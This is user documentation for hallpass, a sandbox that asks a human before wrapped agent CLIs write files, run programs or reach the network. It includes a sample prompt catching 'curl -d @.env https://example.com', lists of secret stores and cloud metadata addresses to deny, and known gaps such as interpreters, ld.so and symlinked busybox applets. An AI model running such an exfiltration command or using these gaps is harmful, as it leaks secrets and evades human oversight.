# Usage

Run a command, an agent CLI for example, in the sandbox from your project directory:

```console
hallpass -- copilot      # no command: your $SHELL
```

The command can write the project without asking; any other write, and any program outside the common ones, pauses it and asks you. `hallpass policy` prints the rules a run with the same flags would get, and Ctrl-] in a session shows the current ones. Every flag is in the [CLI reference](reference.md).

## Default policy

By default, only `~/.config/hallpass`, the hallpass binary itself and the session sockets' directory (`$XDG_RUNTIME_DIR/hallpass`) are denied (the sandbox must not change what hallpass runs next time, even when the binary sits in the project, nor tamper with the sessions); the project, a private `$TMPDIR` for the session (removed at exit if empty) and the usual `/dev` nodes are writable; anything else is asked, including the shared `/tmp`, `/var/tmp` and `/dev/shm` (answer "always" to allow them). `hallpass policy` prints the resulting rules.

`--allow-path` adds a folder writable without asking, `--deny-path` one always denied, and `--ask-path` carves an exception out of what is allowed: with `--allow-path ~/.config --ask-path ~/.config/gh`, writes to `~/.config/gh` are asked about and the rest of `~/.config` is not. The most specific rule decides, an ask wins over an allow as specific, and a deny wins over both. This works in both modes: in strict mode, the kernel denies a write under an asked folder unless you answer.

Writes to known secret stores (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.config/gh`, `~/.kube`, `~/.docker`, `~/.netrc`, `~/.git-credentials`) are asked about like any other write, but the prompt is flagged in red (for example "SSH keys — secret store"), so allowing one is a deliberate choice rather than a reflex. They are not denied outright: writing them is sometimes legitimate (`ssh-keygen`, `gh auth login`, `aws configure`), and a silent deny would hide the attempt instead of surfacing it.

When the sandbox starts, hallpass prints one line on stderr with the mode, the session number (hallpass's pid, as `hallpass answer` and `hallpass web` show it) and where to answer:

```
hallpass: sandbox started (lite, session 1234). Ctrl-] for the menu, then w for the web UI; 'hallpass web' in another terminal for all sessions.
```

Press Ctrl-] inside a session to see its current rules, including answers given so far; `r` lists them to [add, edit or delete](../answers/index.md#editing-rules) one (`hallpass answer rules` from another terminal), `w` opens the session's [web UI](../answers/web.md#from-a-session), any other key closes the overlay.

On a terminal, the window title starts with `[hallpass]` until the session ends: every title the program sets gets the prefix, and the command running in the foreground, if it is not a shell, is appended (`[hallpass] ~/src — vim main.go`), since the terminal itself only sees hallpass. At exit, hallpass restores the previous title in terminals that support the title stack (xterm, VTE-based ones such as GNOME Terminal); elsewhere, the title stays until your shell sets a new one.

With `--no-implicit`, nothing is writable unless you `--allow-path` it: not the project, not a `$TMPDIR`, not even `/dev/null`. The session's own terminal stays off too, unless you also pass `--allow-tty` (its `/dev/pts/N` is only known once hallpass starts). Only the command and the `--allow-exec` programs run without asking: the groups allowed implicitly are off. See [use cases](use-cases.md) for examples.

## Programs

With `exec` in `--mediate` (the default), hallpass asks before a sandboxed process runs a program no rule allows, like a write:

```
 hallpass: sh (pid 4242) wants to exec
 /usr/bin/curl
 by: sh -c curl -d @.env https://example.com ← bash
 [t] and [a] allow: /usr/bin/curl
```

A program that belongs to a group of programs is offered with its group too:

```
 [g] allows the group: @build (make, aarch64-linux-gnu-gcc-15: 2 programs)
 [o] allow once  [t] for 5m0s  [a] always  [g] group  [d] deny  [n] never  [Esc] dismiss
```

<video src="../../assets/demos/exec.mp4" poster="../../assets/demos/exec.png" controls muted playsinline aria-label="a shell under hallpass --group=@build=make,cc: ls and grep run without a question, make is asked with its group offered and the group allowed, curl is asked and denied, a program built in the project is asked and allowed always, Ctrl-] shows the groups by name and count under Run"></video>

*The implicit groups let the common tools run without a question. `make` is asked about with its group, `@build` (defined with `--group`), offered; `curl` and a program built in the project are asked about; "always" allows that program only.*

Allowed without asking: the command given to hallpass (as found in `$PATH`, symlinks resolved), any number of times, the groups `@shells`, `@coreutils`, `@search` and `@git` (but for `--no-implicit`), and what `--allow-exec` names. A program is its resolved path: `--allow-exec=make` allows `/usr/bin/make`, not every program named `make`; answers ("once", "this session", "always", "never") cover that program only. `--allow-exec=DIR/**` allows every program below `DIR`. Denied programs fail with `EACCES` ("Permission denied", exit code 126 in a shell). A script runs only if its `#!` interpreter may run too: the kernel runs both.

Groups name common sets of programs, resolved to exact paths when the session starts (the programs found in `$PATH`, symlinks followed): `--allow-exec=@shells,@coreutils` allows them all, and a prompt about a program of a group offers "group", which allows the rest of the group for the session. `hallpass policy` and Ctrl-] list a group by name and count; `hallpass policy --allow-exec=@git` shows what it has here.

| Group | Programs |
|---|---|
| `@shells` | `sh`, `bash`, `dash`, `zsh`, `ash`, `env` |
| `@coreutils` | the GNU coreutils programs (`cat`, `ls`, `cp`, `mv`, `rm`, `mkdir`, `chmod`, `head`, `sort`, ...) |
| `@search` | `grep`, `rg`, `find`, `xargs`, `sed`, `awk`, `diff`, `file`, `less`, `which`, `jq`, ... |
| `@git` | `git` and its helpers in `git-core` |
| `@busybox` | `busybox` and its applets installed as hard links (container images) |

Groups are yours to change: `--group=@tools=make,cc,/opt/tools/**` defines `@tools` (programs as in `--allow-exec`, without groups), and `--group` with the name of a built-in group replaces it (`--group=@search=grep,rg`). The groups you define are offered in prompts and allowed by `--allow-exec=@tools` like the built-in ones. A [HallpassPolicy](../kubernetes/policies.md) does the same with `groups`. Names are `@`, a lowercase letter, then lowercase letters, digits or `-`.

Exec rules decide which programs start, not what they do once running, so they are a speed bump against an agent reaching for an unexpected tool, not a boundary:

- **Interpreters run any code**: an allowed `python3`, `node` or `bash` runs whatever `-c`/`-e` code or script it is given, and `ld.so /path/to/program` runs a program without executing it. Allowing an interpreter or the dynamic loader allows everything it can do. Rules on the arguments are planned.
- **Copies**: a program copied (or downloaded) to a path an allow covers runs. The project directory is writable, not executable: a program built or copied there is asked about.
- **Multi-call binaries**: when several commands are one binary (busybox, uutils coreutils), they are told apart by path. Commands installed as hard links or copies have paths of their own; commands installed as symlinks all resolve to the one binary, so allowing one of them, or its group, allows all: `busybox` with symlinked applets runs every applet once any is allowed. Telling them apart needs `argv[0]`, which rules do not look at yet.
- **File descriptors**: a program run from a file descriptor (`execveat` with `AT_EMPTY_PATH`, for example a `memfd`) is asked about as an unknown path in lite mode ("once" only). Strict mode matches the rules on the file the descriptor is open on, without asking, and always denies a `memfd`, which has no path.
- **binfmt_misc**: lite mode checks a program and its `#!` interpreters, not the handlers the kernel registers for other formats (qemu, Wine): they run. Strict mode checks them in the kernel, but they are never asked about: a handler runs only if a rule allows it (`--allow-exec=/usr/bin/qemu-aarch64-static`), and the program is denied otherwise.

## Network (experimental)

With `--mediate=write,exec,connect`, hallpass also asks before a sandboxed process connects or sends to a destination:

```
 hallpass: curl (pid 4242) wants to connect to
 140.82.112.3:443
 (tcp)
 by: curl https://140.82.112.3 ← bash
 [t] and [a] allow: 140.82.112.3:443
```

Destinations are addresses: `1.2.3.4:443` with the protocol (`tcp`, `udp`) below, `[2001:db8::1]:53`, `unix /run/user/1000/bus`, `unix @name` (abstract). With `--dns=observe` (the default), an address is shown after its host name when the sandbox asked its DNS server about that name: `github.com (140.82.112.3:443)`. See [Names](../how-it-works/network.md#names) for where names come from, and when there is none. Answers cover that destination only, with any protocol; for an address with a name, "temp" and "always" cover the name and port instead (`github.com:443`: any address the sandbox's DNS gives that name), and `[s]` (the "domain" answer) every name below its registrable domain (`*.github.com:443`, from the [public suffix list](https://publicsuffix.org/)). "never" stays on the address. One kind is allowed without asking: a loopback or unix listener started inside the sandbox, such as a test server the agent runs; with `--no-implicit` it is asked, with the note "listener started inside the sandbox". Address sorting probes (a UDP `connect` that sends nothing) are not asked about, and nothing can be sent on their socket: see [Network](../how-it-works/network.md).

`--allow-connect`, `--deny-connect` and `--ask-connect` take:

| Syntax | Covers |
|---|---|
| `all` | every destination, unix sockets included |
| `[tcp:\|udp:]ADDR[/N][:PORT[-PORT]]` | addresses, an optional protocol and ports; `*` for any address, IPv6 in brackets: `tcp:*:443`, `10.0.0.0/8`, `udp:[::1]:53` |
| `[tcp:\|udp:]HOST[:PORT[-PORT]]` | the addresses that have a host name, `github.com:443`, or any name below one, `*.githubusercontent.com:443` (not the name itself) |
| `unix:/path`, `unix:/dir/**` | a unix socket file, or every one under `/dir` |
| `unix:@name`, `unix:@prefix*` | an abstract name, or every one starting with `prefix` |

For example, `hallpass --mediate=write,exec,connect --allow-connect=tcp:*:443 --deny-connect=169.254.169.254 -- copilot` lets the agent reach HTTPS servers, never the cloud metadata service, and asks about the rest.

A host rule matches an address when the sandbox's own DNS answer gave it that name (or hallpass's lookup of a name the sandbox asked about, see [Names](../how-it-works/network.md#names)): a program connecting to a hard-coded address, or after a lookup hallpass did not see (DNS over HTTPS), is asked about the address. Names that share an address share the rule: allowing `a.example` on a content delivery network's address allows any site the program reaches at that address. The names stay on an address for 5 minutes at least, or the answer's TTL.

The cloud metadata addresses, `169.254.169.254`, `fd00:ec2::254`, `168.63.129.16` (Azure's WireServer) and `100.100.100.200` (Alibaba Cloud), are denied when `connect` is mediated, even with `--allow-connect=all`: they serve the machine's cloud credentials. A rule naming the address itself overrides that (`--allow-connect=169.254.169.254:80`), not a rule by name, and so does `--no-implicit`. Host rules never match loopback (but `localhost`) nor link-local addresses: a name the sandbox's DNS points there (DNS rebinding) is asked about by address.

`--ask-connect` carves an exception out of what `--allow-connect` allows: with `--allow-connect=10.0.0.0/8 --ask-connect=tcp:10.0.0.1:22`, SSH to `10.0.0.1` is asked about and the rest of the subnet is not. The most specific rule decides, an ask wins over an allow as specific, and `--deny-connect` wins over both. This works in both modes: in strict mode, the kernel denies the asked destination unless you answer "once" (or a more specific `--allow-connect` allows it).

Some destinations are always denied, even with `--allow-connect=all`, because they could answer for the sandbox: the session sockets (in `$XDG_RUNTIME_DIR/hallpass/`) and the ports of the running [`hallpass web`](../answers/web.md) UIs, including one started after the session. The Ctrl-] menu and `hallpass policy` list them as "(hallpass sessions)" and "(hallpass web UI)"; they cannot be removed. Writes to `$XDG_RUNTIME_DIR/hallpass/` are always denied too, with or without network mediation.

### HTTPS requests (experimental)

A host with at least one `http` rule (in a rule file, or `--allow-http`, `--ask-http`, `--deny-http`) goes through hallpass's HTTPS proxy, and each request is decided on its own: method, host and path. Every other host stays a direct connection, unseen.

```sh
hallpass --mediate=write,exec,connect --rules github.rules -- copilot
```

```text
# github.rules
allow connect *.githubusercontent.com:443
allow http GET https://api.github.com/**
allow http GET POST https://github.com/alban/*/git-upload-pack
ask   http POST https://api.github.com/repos/alban/*/issues/*/comments
deny  http *    https://api.github.com/repos/*/*/pulls/*/merge
```

- `METHOD...`: one or more methods (`GET POST`), or `*` for any. `URL`: `https://HOST/PATH`, `HOST` a name or `*.name` for the names below it, `PATH` a glob: `*` within one segment, a final `/**` everything below. No query, port or user.
- A request no rule decides is asked about, like a write: `gh (pid 4242) wants to POST: https://api.github.com/repos/alban/hallpass/issues/42/comments`. "temp" and "always" cover that method on that path; a denied request gets a `403` from hallpass, and the server never sees it.
- How: when the sandbox connects to port 443 of an address whose name has `http` rules (see [Names](../how-it-works/network.md#names): the sandbox's own DNS answer must name it), hallpass puts one end of a loopback TCP connection in place of the sandbox's socket. Its proxy answers TLS with a certificate from a certificate authority made for the session, whose key never leaves hallpass's memory and which can only sign for the hosts of the `http` rules (X.509 name constraints). Allowed requests go to the address the sandbox connected to, over TLS checked against the system's roots, under the name the sandbox asked for, and their answers back.
- That connection is made in the sandbox's network namespace: disconnected and connected again, the socket reaches only what the sandbox's own sockets reach, and its connect is asked about like any other. A socket of a network namespace the sandbox made itself (`unshare -n`, rootless Podman) is not swapped: its connect is decided by the `connect` rules, and it reaches out only through a relay whose own connect is asked about. A connect on a socket connected already fails with `EISCONN`, as without hallpass. A copy of the socket made before the connect (`dup`) keeps the original socket, unconnected. Linux 5.14 or later: before, the hosts with `http` rules cannot be reached.
- The sandbox trusts that authority through a bundle in `$XDG_RUNTIME_DIR/hallpass/PID.trust/` (the system's roots and the session's), named by `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, `REQUESTS_CA_BUNDLE`, `AWS_CA_BUNDLE` and `CLOUDSDK_CORE_CUSTOM_CA_CERTS_FILE`, and `NODE_EXTRA_CA_CERTS` (the session's alone). A program with its own roots, or that pins its server's certificate, fails with a TLS error.
- HTTP/1.1 only: clients offering HTTP/2 fall back. The hosts are those of the `http` rules when the session starts. GraphQL (`POST /graphql`) cannot be told read from write by its URL.
- Without names (`--dns=off`), or without a proxy, a session with `http` rules or credentials is denied port 443 (TCP and UDP, reason `no-proxy`), whatever its `connect` rules allow: its `http` rules are not ignored, nor a placeholder sent. hallpass says so when the session starts.
- On Kubernetes, a HallpassPolicy's `http` rules work the same way: hallpass-node makes a CA per container when it is created, mounts its directory read-only at `/run/hallpass-trust/` with the variables above, fills the bundle with the certificates of the container image's own bundle when the container starts, and makes the connection in place of the container's socket, and its own to the servers, in the pod's network namespace. The servers are verified with hallpass-node's roots (its image's, or `--upstream-roots`), never the container's: an image trusting its own authority would otherwise get a credential sent to a server it controls. It needs DNS names (Linux 5.14); a container whose policy has `http` rules or credentials but which gets no proxy (no names, no CA bundle in its image, or hallpass-node restarted since it started) is denied port 443, as on a workstation, with a Warning Event.

### Credentials (experimental)

`--credential NAME` (or a `credential NAME` line in a rule file) keeps a token out of the sandbox: the sandbox gets a placeholder of the same shape, and the proxy puts the real value on the wire, only in requests to the credential's hosts, only over TLS it verified.

```sh
hallpass --mediate=write,exec,connect --allow-connect=github.com:443 --allow-connect=api.github.com:443 --credential gh -- copilot
```

- A profile says, as data, which hosts a credential is for, where its value comes from, and which variables give the tool its placeholder. The built-in `gh` profile reads the token with `gh auth token` (outside the sandbox, when the session starts), sets `GH_TOKEN` to the placeholder, and keeps `GITHUB_TOKEN` from the sandbox; git gets it too with `gh auth setup-git`. Your own profiles go in `~/.config/hallpass/credentials.d/NAME.toml`, which the sandbox cannot write, and are named `config:NAME` (`--credential config:ghe`). A plain name is a built-in profile only, `config:NAME` your file only: yours never shadows a built-in profile, and a built-in one added later never takes yours.

  ```toml
  name   = "ghe"
  hosts  = ["ghe.example.com"]
  source = "env:GHE_TOKEN"          # or file:PATH, or cmd:COMMAND ARGS
  mode   = "mask"                   # pass: the sandbox gets the value itself
  prefix = "ghp_"                   # the placeholder: this prefix,
  chars  = "A-Za-z0-9"              # then random characters of these,
  length = 36                       # this many
  env    = { GH_ENTERPRISE_TOKEN = "{placeholder}" }
  strip  = ["GITHUB_TOKEN"]
  ```

  Without `prefix`, `chars` or `length`, the placeholder has `hallpass_`, `a-z0-9`, `32`; it needs 96 random bits or more.

- The proxy replaces the placeholder in the `Authorization` header only, inside Basic authorization too (git sends the token as a password); not in other headers, nor in bodies. In the answers' headers, the value is replaced by the placeholder (a server echoing the request's authorization).
- A request carrying the placeholder, or the value, to another host the proxy sees is refused (`403`) and reported on the terminal. A tripwire, not the protection: it sees only the requests through the proxy (hosts with `http` rules or credentials), only their headers and Basic authorization, only the literal string; an encoding, a body, another host or DNS go around it. The placeholder is a strong sign (only hallpass hands it out, and it is useless elsewhere); the value catches only the naive case (mode `pass`, or a token the sandbox read from a file, see below). The protection is the placeholder (mode `mask`) and the `connect` and `http` rules.
- The credential's hosts go through the proxy; without `http` rules for them, their connections are asked about and allowed as any others, and their requests are not. An allowed connection that cannot be handed to the proxy is denied (reason `proxy-failed`), not sent with the placeholder.
- The proxy knows a connection is for a credential's host only by the names of its address (see [Names](../how-it-works/network.md#names)): one the session made to an address without a name (a hard-coded address, a name resolved by DNS over HTTPS or `/etc/hosts`) goes out directly, with the placeholder, and the server refuses it (`401`).
- The sandbox can still read the value where it lives (`~/.config/gh/hosts.yml`) unless reads of it are denied.
- On Kubernetes, the value comes from a Secret in the pod's namespace, named in the HallpassPolicy, never mounted in the pod; hallpass-node reads it when the container is created, only if the namespace's owner granted it (no Secret access by default). Profiles: the built-in ones, and `config:NAME`, those of a ConfigMap the cluster's administrators manage. See [Credentials](../kubernetes/policies.md#credentials).

## Rule files

`--rules FILE` (repeatable) adds the rules of a file, one per line, in the syntax of `hallpass answer add`:

```text
# build.rules
allow write ~/.cache/go-build/**
ask   write $WORKDIR/.git/hooks/**     # hooks run outside the sandbox
allow write /tmp/build.log
allow write ~/"My Documents"/notes/**
allow exec  /usr/local/go/bin/**
allow exec  @busybox
deny  exec  /usr/bin/curl
allow connect tcp:*:443
deny  connect 169.254.169.254

group @build /usr/bin/make /usr/bin/cc "/opt/my tools/**"
allow exec  @build
```

- `write PATH`, `exec PROGRAM` and `connect DESTINATION` are the rules of `--allow-path`, `--allow-exec` and `--allow-connect`, with `allow`, `deny` or `ask`: `PATH/**` is a tree, `PATH` that file or program only (unlike `--ask-path`, always a tree). `allow exec @NAME` allows a group of programs. exec rules need exec in `--mediate`, connect rules connect.
- `http METHOD... URL` are HTTPS requests through hallpass's proxy (see [HTTPS requests](#https-requests-experimental)): `allow http GET https://api.github.com/**`, `ask http POST PUT https://api.github.com/repos/*/*/issues/**`, `deny http * https://api.github.com/repos/*/*/pulls/*/merge`. They need connect in `--mediate`.
- `group @NAME PROGRAM...` defines a group of programs, as `--group` does: absolute paths, `/dir/**` for every program below. A group is defined once, by `--group` or a rule file; a built-in group can be replaced.
- Words are separated by blanks, and are made of letters, digits and `/ . _ - + * ~ @ : = % [ ]`. Anything else (a blank, a quote, `#`, `,`, `$`...) needs quotes, as in a shell:
    - `"..."` expands variables, and takes the escapes `\"`, `\\`, `\$` and those of Go strings (`\t`, `\n`, `\x1b`, `\u202e`...): `"$HOME/My Documents/**"`.
    - `'...'` is literal: `'/data/$weird'`.
    - Quoted and unquoted parts make one word when nothing separates them: `~/"My Documents"/**`.
    - Characters that are not printable must be written as escapes, in double quotes.
- `#` at the start of a word starts a comment, to the end of the line; `"a#b"` is quoted.
- `~` at the start of a word and the variables `$HOME`, `$WORKDIR` (the project directory), `$UID` and `$XDG_RUNTIME_DIR` (`${NAME}` too) are expanded, unquoted or in `"..."`; any other variable is an error.
- No expiry (`for 10m`): the rules last the session.
- A file in the project directory is refused: the sandbox could write it for the next session.

The rules are listed by `hallpass policy --rules FILE` with the flags' ones, and can be edited during the session like them. An invalid line stops hallpass with its file and line number. A [HallpassPolicy](../kubernetes/policies.md) takes the same text in its `rules` field.

The rules listed by hallpass and shown for editing are written in the same syntax, quoted when needed: a path with a terminal escape or a bidi override shows as `"/x\x1b[2J"` or `"/x\u202e"`, never raw.

## Background processes

Processes the command leaves behind (daemons, `nohup`, double forks) stay under hallpass: it becomes their subreaper, so their writes are asked about like any other.

By default (`--wait=main`), hallpass exits with the command. The processes left behind keep the seccomp filter but lose their supervisor: their mediated syscalls then fail (fail closed). With `--wait=all`, hallpass keeps supervising, asking and logging until the last of them exits; the prompts keep working in the terminal. Press Ctrl-] then `s`, or send SIGTERM, to stop waiting early. `--wait=all` needs Linux 5.9.

## Unreadable paths

Sometimes hallpass cannot read the path a syscall passes, for example when the pointer is invalid. In lite mode, hallpass asks with a red "Unknown path" warning, and only offers "once", "deny" and "never" ("never" denies every unknown path for the rest of the session): allowing such a write skips every rule, so it is never granted for good. In strict mode, the kernel's rules decide on the real file, without asking.

## Signals during a prompt

While a prompt is pending, the paused thread only reacts to fatal signals (Linux 5.19 and later): a Ctrl-C or other handled signal is delivered once you answer, instead of restarting the syscall and asking again.

## Asking in advance

A program that knows it will write a folder later, run a program or reach a network destination, for example an agent about to start a long task while you are still there, can ask for it beforehand, so that you are not prompted while you are away. The [`hallpass-request`](agents.md#hallpass-request) helper does it with a plain command line and exit codes (`hallpass-request write '/home/me/.cache/build/**' --for 30m --reason 'cache object files'`); underneath, and for scripts that do without it, it runs a magic path that names what it wants:

```console
exec '/proc/self/hallpass/request?op=write&path=/home/me/.cache/build/**&for=30m&reason=cache+object+files'
```

The request shows a card in every client (terminal, desktop notification, `hallpass answer`, [web UI](../answers/web.md), Headlamp), with the folder, how long and the program's reason. The reason is the program's own words: hallpass shows it marked as unverified, never as a fact.

```
 hallpass: dash (pid 4242) asks in advance to write
 /home/me/.cache/build/**
 by: sh -c "exec '/proc/self/hallpass/request?op=write&path=/home/me/.cache/bu…
 reason given by the program (unverified): "cache object files"
 [g] grant for 30m  [d] deny  [Esc] dismiss
```

`grant` adds the same rule as the matching allow flag (`--allow-path`, `--allow-exec`, `--allow-connect`), with an expiry, in the rule set `advance`: Ctrl-] lists it, the web UI and `hallpass answer` can edit or remove it (the web UI the whole set too), and in [strict mode](../how-it-works/strict.md) the kernel enforces it like the other rules. The call blocks until you answer. For a program the sandbox may write without asking (or a folder of programs where it may), the card warns you: a grant would let it run anything it writes there.

The query string:

| Key | Value |
|---|---|
| `op` | `write` (every file operation hallpass mediates), `exec` (running a program), `connect` (connecting and sending to network destinations) or `http` (HTTPS requests through the proxy) |
| `path` | `write`, `exec`: an absolute path; ending in `/**`, the folder and everything below it. No other globs (`*`, `?`, `[`). Percent-encode `&`, `;`, `%` and `+` in it (`%26`...) |
| `dest` | `connect`: destinations as [`--allow-connect`](#network) takes them, for example `tcp:192.0.2.0/24:443`, `github.com:443`, `[2001:db8::1]:53`, `unix:/run/x.sock`, `unix:@name`; not `all`, and a host name only when hallpass names addresses (not with `--dns=off`). `http`: the methods, a space, and the URL, as an [`http` rule](#https-requests-experimental) takes them: `POST https://api.github.com/repos/alban/*/issues/*/comments` |
| `for` | optional: a duration (`90s`, `10m`, `2h`); without it, the rest of the session |
| `reason` | optional: why, shown to you as the program's words; `+` or `%20` for spaces |

`/proc/self/hallpass/check?...`, with the same keys, asks whether a request would be needed, without asking you.

`/proc/self/hallpass/release?op=...&path=...` (or `dest=`), without `for` and `reason`, gives a grant back before it expires, without asking you: it removes the rules granted to this session's requests for exactly that target (same `op`, same path and `/**`, same destinations). It never removes another rule: not your flags, policy file, answers to other prompts or edits. The terminal prints a notice, and `--log` a line with decision `release`.

hallpass never runs anything: the `execve` always fails, and its error number is the answer. A shell prints it (exit code 126, or 127 when there is no hallpass; dash also exits 127 for `ENAMETOOLONG`):

| errno | Message | Meaning |
|---|---|---|
| `EEXIST` | File exists | already allowed for that long: nobody was asked |
| `EALREADY` | Operation already in progress | granted |
| `EPERM` | Operation not permitted | denied or dismissed, or a rule denies part of it |
| `ETIMEDOUT` | Connection timed out | nobody answered within `--timeout` |
| `ENOMSG` | No message of desired type | (check) a request would ask you |
| `EINVAL`, `ENAMETOOLONG` | Invalid argument, File name too long | malformed request |
| `ENOSYS` | Function not implemented | the operation's category (write, exec, connect) is not mediated (`--mediate`, or a Kubernetes policy's `mediate`): nothing would enforce a grant, so nobody is asked |
| `ENOENT` | No such file or directory | no hallpass: the path does not exist |
| `ECANCELED` | Operation canceled | (release) given back |
| `ESRCH` | No such process | (release) no grant of a request for exactly that target |

With `--prompt=deny`, requests are denied (`EPERM`) without a card; with `--prompt=allow`, they are granted. A request is covered (`EEXIST`) when the rules already allow the whole path, or every destination, for the duration asked, so asking again right after a grant does not prompt; a deny or ask rule inside it takes part of it away, and then it asks.

Agents learn it from a skill or their instructions file: see [Agents](agents.md#tell-the-agent), which uses `hallpass-request`. Where the helper is not installed, an instructions file (`AGENTS.md`, `.github/copilot-instructions.md`, `CLAUDE.md`...) can teach the magic path itself, for example:

````markdown
## Sandbox

You run under hallpass, which asks the user before writes outside the
project. Before a long task that writes elsewhere, ask for the folder
once, while the user is there:

```sh
sh -c "exec '/proc/self/hallpass/request?op=write&path=$HOME/.cache/build/**&for=1h&reason=build+cache+for+the+test+run'"
```

The command always fails: read its message. "Operation already in
progress" (granted) or "File exists" (already allowed): go ahead.
"Operation not permitted" or "Connection timed out": do not write
there, tell the user. "No such file or directory": no hallpass.
Ask only for what the task needs, and say why in the reason.
````

<video src="../../assets/demos/advance-grant.mp4" poster="../../assets/demos/advance-grant.png" controls muted playsinline aria-label="a script checks, then asks in advance to write ~/.cache/build for 30 minutes, with its reason marked unverified; after one grant, its writes there go through without prompts, and Ctrl-] shows the rule with its expiry"></video>

*One question before the task, none during it: the grant is a rule with an expiry.*

## Using hallpass with agent CLIs

Wrap the top-level command; there is nothing to configure in the agent (to let it [ask in advance](agents.md), give it the `hallpass-request` helper):

```console
hallpass -- copilot
hallpass -- claude
hallpass -C ~/src/app -- codex
```

Agents keep their own state (sessions, logs, caches) outside the project. For copilot that is `~/.copilot` and `~/.cache/copilot`:

```console
hallpass --allow-path ~/.copilot --allow-path ~/.cache/copilot -- copilot
```

The `-allow` flags are optional: without them, hallpass asks you when copilot writes there, which is a good way to see what an agent touches. Allowing all of `~/.copilot` does let the agent change its own config or hooks, which would apply to later runs without hallpass.

Things to know:

- **Full-screen TUIs**: hallpass draws its question over the agent's screen and repaints it afterwards; the agent's terminal is never resized. This also works over ssh.
- **Agents' own sandboxes**: some agents run commands inside their own bubblewrap sandbox (for example Codex), which creates user and mount namespaces. hallpass lite mode blocks new namespaces by default, because inside a private mount namespace a process could bind-mount a protected directory somewhere that looks harmless. The agent's own sandbox will then fail to start or fall back; disable it in the agent, pass `--allow-userns` and accept the weaker lite-mode guarantees, or use strict mode, which allows namespaces because it checks real inodes.
- **Agents that use seccomp user notification themselves** cannot install their own listener under hallpass: the kernel allows only one listener per filter chain and returns `EBUSY`. This fails closed.
- **sudo** does not work inside the sandbox (`no_new_privs`), in either mode, by design.

## Over ssh

hallpass draws its prompt over the terminal, so it works over ssh like any other full-screen program. Without a terminal (for example a non-interactive session, or when the agent fully owns the screen), use a desktop prompt (`--prompt=desktop`) or answer from another terminal:

```console
hallpass --prompt=answer -- copilot     # in one terminal
hallpass answer                      # in another, to see prompts and reply
```

`hallpass answer` connects to the running session's socket, shows each pending request (path, the `by:` command line and its parents) and lets you give the same [answers](../answers/index.md) as the terminal. Every client answers the same requests: the first answer wins, and the others take their prompt down, the terminal overlay included. `hallpass answer rules`, `add`, `edit` and `delete` [edit the session's rules](../answers/index.md#editing-rules), like the Ctrl-] menu and the web UI.

`hallpass answer` is mainly a testing and debugging aid, and a fallback for the headless case above; the terminal overlay is the normal way to answer. The socket serves a gRPC API (`api/session/v1/session.proto`, see [Write a client](../answers/api.md)) to follow and answer the session. It only accepts a client of the same user that is not itself sandboxed (it rejects any peer running under a seccomp filter), so the sandbox cannot answer its own prompts through it.

The [web UI](../answers/web.md) (`hallpass web`, experimental) does the same in a browser, for every session of the user.

See [Limitations](../how-it-works/limitations.md) for what hallpass does not cover.
